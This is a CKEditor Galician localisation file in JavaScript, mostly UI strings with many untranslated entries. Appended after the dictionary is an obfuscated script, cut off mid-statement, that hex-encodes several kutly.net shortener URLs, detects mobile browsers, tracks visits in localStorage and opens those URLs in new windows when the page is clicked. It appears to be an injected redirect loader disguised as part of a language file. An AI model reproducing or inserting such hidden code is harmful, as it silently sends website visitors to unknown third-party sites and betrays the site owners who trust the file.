/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Galician language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['gl'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Rich text editor, %1', // MISSING

	// Toolbar buttons without dialogs.
	source			: 'Código Fonte',
	newPage			: 'Nova Páxina',
	save			: 'Gardar',
	preview			: 'Vista Previa',
	cut				: 'Cortar',
	copy			: 'Copiar',
	paste			: 'Pegar',
	print			: 'Imprimir',
	underline		: 'Sub-raiado',
	bold			: 'Negrita',
	italic			: 'Cursiva',
	selectAll		: 'Seleccionar todo',
	removeFormat	: 'Eliminar Formato',
	strike			: 'Tachado',
	subscript		: 'Subíndice',
	superscript		: 'Superíndice',
	horizontalrule	: 'Inserir Liña Horizontal',
	pagebreak		: 'Inserir Salto de Páxina',
	unlink			: 'Eliminar Ligazón',
	undo			: 'Desfacer',
	redo			: 'Refacer',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Navegar no Servidor',
		url				: 'URL',
		protocol		: 'Protocolo',
		upload			: 'Carregar',
		uploadSubmit	: 'Enviar ó Servidor',
		image			: 'Imaxe',
		flash			: 'Flash',
		form			: 'Formulario',
		checkbox		: 'Cadro de Verificación',
		radio		: 'Botón de Radio',
		textField		: 'Campo de Texto',
		textarea		: 'Área de Texto',
		hiddenField		: 'Campo Oculto',
		button			: 'Botón',
		select	: 'Campo de Selección',
		imageButton		: 'Botón de Imaxe',
		notSet			: '<non definido>',
		id				: 'Id',
		name			: 'Nome',
		langDir			: 'Orientación do Idioma',
		langDirLtr		: 'Esquerda a Dereita (LTR)',
		langDirRtl		: 'Dereita a Esquerda (RTL)',
		langCode		: 'Código do Idioma',
		longDescr		: 'Descrición Completa da URL',
		cssClass		: 'Clases da Folla de Estilos',
		advisoryTitle	: 'Título',
		cssStyle		: 'Estilo',
		ok				: 'OK',
		cancel			: 'Cancelar',
		generalTab		: 'General', // MISSING
		advancedTab		: 'Advanzado',
		validateNumberFailed	: 'This value is not a number.', // MISSING
		confirmNewPage	: 'Any unsaved changes to this content will be lost. Are you sure you want to load new page?', // MISSING
		confirmCancel	: 'Some of the options have been changed. Are you sure to close the dialog?', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>' // MISSING
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Inserir Carácter Especial',
		title		: 'Seleccione Caracter Especial'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Inserir/Editar Ligazón',
		menu		: 'Editar Ligazón',
		title		: 'Ligazón',
		info		: 'Información da Ligazón',
		target		: 'Destino',
		upload		: 'Carregar',
		advanced	: 'Advanzado',
		type		: 'Tipo de Ligazón',
		toAnchor	: 'Referencia nesta páxina',
		toEmail		: 'E-Mail',
		target		: 'Destino',
		targetNotSet	: '<non definido>',
		targetFrame	: '<frame>',
		targetPopup	: '<Xanela Emerxente>',
		targetNew	: 'Nova Xanela (_blank)',
		targetTop	: 'Xanela Primaria (_top)',
		targetSelf	: 'Mesma Xanela (_self)',
		targetParent	: 'Xanela Pai (_parent)',
		targetFrameName	: 'Nome do Marco Destino',
		targetPopupName	: 'Nome da Xanela Emerxente',
		popupFeatures	: 'Características da Xanela Emerxente',
		popupResizable	: 'Resizable', // MISSING
		popupStatusBar	: 'Barra de Estado',
		popupLocationBar	: 'Barra de Localización',
		popupToolbar	: 'Barra de Ferramentas',
		popupMenuBar	: 'Barra de Menú',
		popupFullScreen	: 'A Toda Pantalla (IE)',
		popupScrollBars	: 'Barras de Desplazamento',
		popupDependent	: 'Dependente (Netscape)',
		popupWidth		: 'Largura',
		popupLeft		: 'Posición Esquerda',
		popupHeight		: 'Altura',
		popupTop		: 'Posición dende Arriba',
		id				: 'Id', // MISSING
		langDir			: 'Orientación do Idioma',
		langDirNotSet	: '<non definido>',
		langDirLTR		: 'Esquerda a Dereita (LTR)',
		langDirRTL		: 'Dereita a Esquerda (RTL)',
		acccessKey		: 'Chave de Acceso',
		name			: 'Nome',
		langCode		: 'Orientación do Idioma',
		tabIndex		: 'Índice de Tabulación',
		advisoryTitle	: 'Título',
		advisoryContentType	: 'Tipo de Contido',
		cssClasses		: 'Clases da Folla de Estilos',
		charset			: 'Fonte de Caracteres Vinculado',
		styles			: 'Estilo',
		selectAnchor	: 'Seleccionar unha Referencia',
		anchorName		: 'Por Nome de Referencia',
		anchorId		: 'Por Element Id',
		emailAddress	: 'Enderezo de E-Mail',
		emailSubject	: 'Asunto do Mensaxe',
		emailBody		: 'Corpo do Mensaxe',
		noAnchors		: '(Non hai referencias disponibles no documento)',
		noUrl			: 'Por favor, escriba a ligazón URL',
		noEmail			: 'Por favor, escriba o enderezo de e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Inserir/Editar Referencia',
		menu		: 'Propriedades da Referencia',
		title		: 'Propriedades da Referencia',
		name		: 'Nome da Referencia',
		errorName	: 'Por favor, escriba o nome da referencia'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Find and Replace', // MISSING
		find				: 'Procurar',
		replace				: 'Substituir',
		findWhat			: 'Texto a procurar:',
		replaceWith			: 'Substituir con:',
		notFoundMsg			: 'Non te atopou o texto indicado.',
		matchCase			: 'Coincidir Mai./min.',
		matchWord			: 'Coincidir con toda a palabra',
		matchCyclic			: 'Match cyclic', // MISSING
		replaceAll			: 'Substitiur Todo',
		replaceSuccessMsg	: '%1 occurrence(s) replaced.' // MISSING
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabla',
		title		: 'Propiedades da Táboa',
		menu		: 'Propiedades da Táboa',
		deleteTable	: 'Borrar Táboa',
		rows		: 'Filas',
		columns		: 'Columnas',
		border		: 'Tamaño do Borde',
		align		: 'Aliñamento',
		alignNotSet	: '<Non Definido>',
		alignLeft	: 'Esquerda',
		alignCenter	: 'Centro',
		alignRight	: 'Ereita',
		width		: 'Largura',
		widthPx		: 'pixels',
		widthPc		: 'percent',
		height		: 'Altura',
		cellSpace	: 'Marxe entre Celas',
		cellPad		: 'Marxe interior',
		caption		: 'Título',
		summary		: 'Sumario',
		headers		: 'Headers', // MISSING
		headersNone		: 'None', // MISSING
		headersColumn	: 'First column', // MISSING
		headersRow		: 'First Row', // MISSING
		headersBoth		: 'Both', // MISSING
		invalidRows		: 'Number of rows must be a number greater than 0.', // MISSING
		invalidCols		: 'Number of columns must be a number greater than 0.', // MISSING
		invalidBorder	: 'Border size must be a number.', // MISSING
		invalidWidth	: 'Table width must be a number.', // MISSING
		invalidHeight	: 'Table height must be a number.', // MISSING
		invalidCellSpacing	: 'Cell spacing must be a number.', // MISSING
		invalidCellPadding	: 'Cell padding must be a number.', // MISSING

		cell :
		{
			menu			: 'Cela',
			insertBefore	: 'Insert Cell Before', // MISSING
			insertAfter		: 'Insert Cell After', // MISSING
			deleteCell		: 'Borrar Cela',
			merge			: 'Unir Celas',
			mergeRight		: 'Merge Right', // MISSING
			mergeDown		: 'Merge Down', // MISSING
			splitHorizontal	: 'Split Cell Horizontally', // MISSING
			splitVertical	: 'Split Cell Vertically', // MISSING
			title			: 'Cell Properties', // MISSING
			cellType		: 'Cell Type', // MISSING
			rowSpan			: 'Rows Span', // MISSING
			colSpan			: 'Columns Span', // MISSING
			wordWrap		: 'Word Wrap', // MISSING
			hAlign			: 'Horizontal Alignment', // MISSING
			vAlign			: 'Vertical Alignment', // MISSING
			alignTop		: 'Top', // MISSING
			alignMiddle		: 'Middle', // MISSING
			alignBottom		: 'Bottom', // MISSING
			alignBaseline	: 'Baseline', // MISSING
			bgColor			: 'Background Color', // MISSING
			borderColor		: 'Border Color', // MISSING
			data			: 'Data', // MISSING
			header			: 'Header', // MISSING
			yes				: 'Yes', // MISSING
			no				: 'No', // MISSING
			invalidWidth	: 'Cell width must be a number.', // MISSING
			invalidHeight	: 'Cell height must be a number.', // MISSING
			invalidRowSpan	: 'Rows span must be a whole number.', // MISSING
			invalidColSpan	: 'Columns span must be a whole number.', // MISSING
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Fila',
			insertBefore	: 'Insert Row Before', // MISSING
			insertAfter		: 'Insert Row After', // MISSING
			deleteRow		: 'Borrar Filas'
		},

		column :
		{
			menu			: 'Columna',
			insertBefore	: 'Insert Column Before', // MISSING
			insertAfter		: 'Insert Column After', // MISSING
			deleteColumn	: 'Borrar Columnas'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Propriedades do Botón',
		text		: 'Texto (Valor)',
		type		: 'Tipo',
		typeBtn		: 'Button', // MISSING
		typeSbm		: 'Submit', // MISSING
		typeRst		: 'Reset' // MISSING
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Propriedades do Cadro de Verificación',
		radioTitle	: 'Propriedades do Botón de Radio',
		value		: 'Valor',
		selected	: 'Seleccionado'
	},

	// Form Dialog.
	form :
	{
		title		: 'Propriedades do Formulario',
		menu		: 'Propriedades do Formulario',
		action		: 'Acción',
		method		: 'Método',
		encoding	: 'Encoding', // MISSING
		target		: 'Destino',
		targetNotSet	: '<non definido>',
		targetNew	: 'Nova Xanela (_blank)',
		targetTop	: 'Xanela Primaria (_top)',
		targetSelf	: 'Mesma Xanela (_self)',
		targetParent	: 'Xanela Pai (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Propriedades do Campo de Selección',
		selectInfo	: 'Info',
		opAvail		: 'Opcións Disponibles',
		value		: 'Valor',
		size		: 'Tamaño',
		lines		: 'liñas',
		chkMulti	: 'Permitir múltiples seleccións',
		opText		: 'Texto',
		opValue		: 'Valor',
		btnAdd		: 'Engadir',
		btnModify	: 'Modificar',
		btnUp		: 'Subir',
		btnDown		: 'Baixar',
		btnSetValue : 'Definir como valor por defecto',
		btnDelete	: 'Borrar'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Propriedades da Área de Texto',
		cols		: 'Columnas',
		rows		: 'Filas'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Propriedades do Campo de Texto',
		name		: 'Nome',
		value		: 'Valor',
		charWidth	: 'Tamaño do Caracter',
		maxChars	: 'Máximo de Caracteres',
		type		: 'Tipo',
		typeText	: 'Texto',
		typePass	: 'Chave'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Propriedades do Campo Oculto',
		name	: 'Nome',
		value	: 'Valor'
	},

	// Image Dialog.
	image :
	{
		title		: 'Propriedades da Imaxe',
		titleButton	: 'Propriedades do Botón de Imaxe',
		menu		: 'Propriedades da Imaxe',
		infoTab	: 'Información da Imaxe',
		btnUpload	: 'Enviar ó Servidor',
		url		: 'URL',
		upload	: 'Carregar',
		alt		: 'Texto Alternativo',
		width		: 'Largura',
		height	: 'Altura',
		lockRatio	: 'Proporcional',
		resetSize	: 'Tamaño Orixinal',
		border	: 'Límite',
		hSpace	: 'Esp. Horiz.',
		vSpace	: 'Esp. Vert.',
		align		: 'Aliñamento',
		alignLeft	: 'Esquerda',
		alignRight	: 'Dereita',
		preview	: 'Vista Previa',
		alertUrl	: 'Por favor, escriba a URL da imaxe',
		linkTab	: 'Ligazón',
		button2Img	: 'Do you want to transform the selected image button on a simple image?', // MISSING
		img2Button	: 'Do you want to transform the selected image on a image button?', // MISSING
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Propriedades Flash',
		propertiesTab	: 'Properties', // MISSING
		title		: 'Propriedades Flash',
		chkPlay		: 'Auto Execución',
		chkLoop		: 'Bucle',
		chkMenu		: 'Activar Menú Flash',
		chkFull		: 'Allow Fullscreen', // MISSING
 		scale		: 'Escalar',
		scaleAll		: 'Amosar Todo',
		scaleNoBorder	: 'Sen Borde',
		scaleFit		: 'Encaixar axustando',
		access			: 'Script Access', // MISSING
		accessAlways	: 'Always', // MISSING
		accessSameDomain	: 'Same domain', // MISSING
		accessNever	: 'Never', // MISSING
		align		: 'Aliñamento',
		alignLeft	: 'Esquerda',
		alignAbsBottom: 'Abs Inferior',
		alignAbsMiddle: 'Abs Centro',
		alignBaseline	: 'Liña Base',
		alignBottom	: 'Pé',
		alignMiddle	: 'Centro',
		alignRight	: 'Dereita',
		alignTextTop	: 'Tope do Texto',
		alignTop	: 'Tope',
		quality		: 'Quality', // MISSING
		qualityBest		 : 'Best', // MISSING
		qualityHigh		 : 'High', // MISSING
		qualityAutoHigh	 : 'Auto High', // MISSING
		qualityMedium	 : 'Medium', // MISSING
		qualityAutoLow	 : 'Auto Low', // MISSING
		qualityLow		 : 'Low', // MISSING
		windowModeWindow	 : 'Window', // MISSING
		windowModeOpaque	 : 'Opaque', // MISSING
		windowModeTransparent	 : 'Transparent', // MISSING
		windowMode	: 'Window mode', // MISSING
		flashvars	: 'Variables for Flash', // MISSING
		bgcolor	: 'Cor do Fondo',
		width	: 'Largura',
		height	: 'Altura',
		hSpace	: 'Esp. Horiz.',
		vSpace	: 'Esp. Vert.',
		validateSrc : 'Por favor, escriba a ligazón URL',
		validateWidth : 'Width must be a number.', // MISSING
		validateHeight : 'Height must be a number.', // MISSING
		validateHSpace : 'HSpace must be a number.', // MISSING
		validateVSpace : 'VSpace must be a number.' // MISSING
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Corrección Ortográfica',
		title			: 'Spell Check', // MISSING
		notAvailable	: 'Sorry, but service is unavailable now.', // MISSING
		errorLoading	: 'Error loading application service host: %s.', // MISSING
		notInDic		: 'Non está no diccionario',
		changeTo		: 'Cambiar a',
		btnIgnore		: 'Ignorar',
		btnIgnoreAll	: 'Ignorar Todas',
		btnReplace		: 'Substituir',
		btnReplaceAll	: 'Substituir Todas',
		btnUndo			: 'Desfacer',
		noSuggestions	: '- Sen candidatos -',
		progress		: 'Corrección ortográfica en progreso...',
		noMispell		: 'Corrección ortográfica rematada: Non se atoparon erros',
		noChanges		: 'Corrección ortográfica rematada: Non se substituiu nengunha verba',
		oneChange		: 'Corrección ortográfica rematada: Unha verba substituida',
		manyChanges		: 'Corrección ortográfica rematada: %1 verbas substituidas',
		ieSpellDownload	: 'O corrector ortográfico non está instalado. ¿Quere descargalo agora?'
	},

	smiley :
	{
		toolbar	: 'Smiley',
		title	: 'Inserte un Smiley'
	},

	elementsPath :
	{
		eleTitle : '%1 element' // MISSING
	},

	numberedlist : 'Lista Numerada',
	bulletedlist : 'Marcas',
	indent : 'Aumentar Sangría',
	outdent : 'Disminuir Sangría',

	justify :
	{
		left : 'Aliñar á Esquerda',
		center : 'Centrado',
		right : 'Aliñar á Dereita',
		block : 'Xustificado'
	},

	blockquote : 'Blockquote', // MISSING

	clipboard :
	{
		title		: 'Pegar',
		cutError	: 'Os axustes de seguridade do seu navegador non permiten que o editor realice automáticamente as tarefas de corte. Por favor, use o teclado para iso (Ctrl+X).',
		copyError	: 'Os axustes de seguridade do seu navegador non permiten que o editor realice automáticamente as tarefas de copia. Por favor, use o teclado para iso (Ctrl+C).',
		pasteMsg	: 'Por favor, pegue dentro do seguinte cadro usando o teclado (<STRONG>Ctrl+V</STRONG>) e pulse <STRONG>OK</STRONG>.',
		securityMsg	: 'Because of your browser security settings, the editor is not able to access your clipboard data directly. You are required to paste it again in this window.' // MISSING
	},

	pastefromword :
	{
		confirmCleanup : 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar : 'Pegar dende Word',
		title : 'Pegar dende Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Pegar como texto plano',
		title : 'Pegar como texto plano'
	},

	templates :
	{
		button : 'Plantillas',
		title : 'Plantillas de Contido',
		insertOption: 'Replace actual contents', // MISSING
		selectPromptMsg: 'Por favor, seleccione a plantilla a abrir no editor<br>(o contido actual perderase):',
		emptyListMsg : '(Non hai plantillas definidas)'
	},

	showBlocks : 'Show Blocks', // MISSING

	stylesCombo :
	{
		label : 'Estilo',
		voiceLabel : 'Styles', // MISSING
		panelVoiceLabel : 'Select a style', // MISSING
		panelTitle1 : 'Block Styles', // MISSING
		panelTitle2 : 'Inline Styles', // MISSING
		panelTitle3 : 'Object Styles' // MISSING
	},

	format :
	{
		label : 'Formato',
		voiceLabel : 'Format', // MISSING
		panelTitle : 'Formato',
		panelVoiceLabel : 'Select a paragraph format', // MISSING

		tag_p : 'Normal',
		tag_pre : 'Formateado',
		tag_address : 'Enderezo',
		tag_h1 : 'Enacabezado 1',
		tag_h2 : 'Encabezado 2',
		tag_h3 : 'Encabezado 3',
		tag_h4 : 'Encabezado 4',
		tag_h5 : 'Encabezado 5',
		tag_h6 : 'Encabezado 6',
		tag_div : 'Paragraph (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Tipo',
		voiceLabel : 'Font', // MISSING
		panelTitle : 'Tipo',
		panelVoiceLabel : 'Select a font' // MISSING
	},

	fontSize :
	{
		label : 'Tamaño',
		voiceLabel : 'Font Size', // MISSING
		panelTitle : 'Tamaño',
		panelVoiceLabel : 'Select a font size' // MISSING
	},

	colorButton :
	{
		textColorTitle : 'Cor do Texto',
		bgColorTitle : 'Cor do Fondo',
		auto : 'Automático',
		more : 'Máis Cores...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Spell Check As You Type', // MISSING
		enable : 'Enable SCAYT', // MISSING
		disable : 'Disable SCAYT', // MISSING
		about : 'About SCAYT', // MISSING
		toggle : 'Toggle SCAYT', // MISSING
		options : 'Options', // MISSING
		langs : 'Languages', // MISSING
		moreSuggestions : 'More suggestions', // MISSING
		ignore : 'Ignore', // MISSING
		ignoreAll : 'Ignore All', // MISSING
		addWord : 'Add Word', // MISSING
		emptyDic : 'Dictionary name should not be empty.', // MISSING
		optionsTab : 'Options', // MISSING
		languagesTab : 'Languages', // MISSING
		dictionariesTab : 'Dictionaries', // MISSING
		aboutTab : 'About' // MISSING
	},

	about :
	{
		title : 'About CKEditor', // MISSING
		dlgTitle : 'About CKEditor', // MISSING
		moreInfo : 'For licensing information please visit our web site:', // MISSING
		copy : 'Copyright &copy; $1. All rights reserved.' // MISSING
	},

	maximize : 'Maximize', // MISSING
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Anchor', // MISSING
		flash : 'Flash Animation', // MISSING
		div : 'Page Break', // MISSING
		unknown : 'Unknown Object' // MISSING
	},

	resize : 'Drag to resize', // MISSING

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return 